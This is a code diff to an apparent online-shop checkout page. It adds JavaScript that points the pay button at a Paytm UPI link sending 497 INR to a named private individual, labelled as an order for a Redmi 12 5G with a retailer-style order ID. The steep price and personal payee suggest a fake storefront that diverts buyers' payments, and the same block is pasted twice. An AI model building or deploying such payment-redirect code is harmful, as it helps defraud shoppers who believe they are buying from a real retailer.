@@ -467,8 +467,40 @@ Place your Order and Pay
 </footer>
 
 <script>
+function makeid(length) {
+let result = '';
+const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+const charactersLength = characters.length;
+let counter = 0;
+while (counter < length) {
+result += characters.charAt(Math.floor(Math.random() * charactersLength));
+counter += 1;
+}
+return result;
+}
+console.log(makeid(10));
+
+const link1 = document.getElementById('upilink');
+link1.href='paytmmp://pay?pa=online-payment@sbi&pn=Mr.%20Sumit%20Kumar%20Suman&mc=7311&tr=' + makeid(10) + '&tn=Redmi%2012%205G%20Pastel%20Blue%20(ORDER%20ID%20-%20FP8744GCD6)&am=497&cu=INR&url=&mode=02&purpose=00&orgid=159002&sign=MEYCIQCke8kk08w+KkZnYNLUUrwqNCFLSiD/Ruao9t4j/MUgjwIhAJZKnG05J7B//h+16TB56+7B0ZSJAQDvPSw75vNGAQIX';
+</script>
+
+<script>
 function cselect1(){
-document.getElementById('upilink').href = "upi18a36.html";
+function makeid(length) {
+let result = '';
+const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+const charactersLength = characters.length;
+let counter = 0;
+while (counter < length) {
+result += characters.charAt(Math.floor(Math.random() * charactersLength));
+counter += 1;
+}
+return result;
+}
+console.log(makeid(10));
+
+const link1 = document.getElementById('upilink');
+link1.href='paytmmp://pay?pa=online-payment@sbi&pn=Mr.%20Sumit%20Kumar%20Suman&mc=7311&tr=' + makeid(10) + '&tn=Redmi%2012%205G%20Pastel%20Blue%20(ORDER%20ID%20-%20FP8744GCD6)&am=497&cu=INR&url=&mode=02&purpose=00&orgid=159002&sign=MEYCIQCke8kk08w+KkZnYNLUUrwqNCFLSiD/Ruao9t4j/MUgjwIhAJZKnG05J7B//h+16TB56+7B0ZSJAQDvPSw75vNGAQIX';
 };
 function cselect2(){
 document.getElementById('upilink').href = "upi28a36.html";
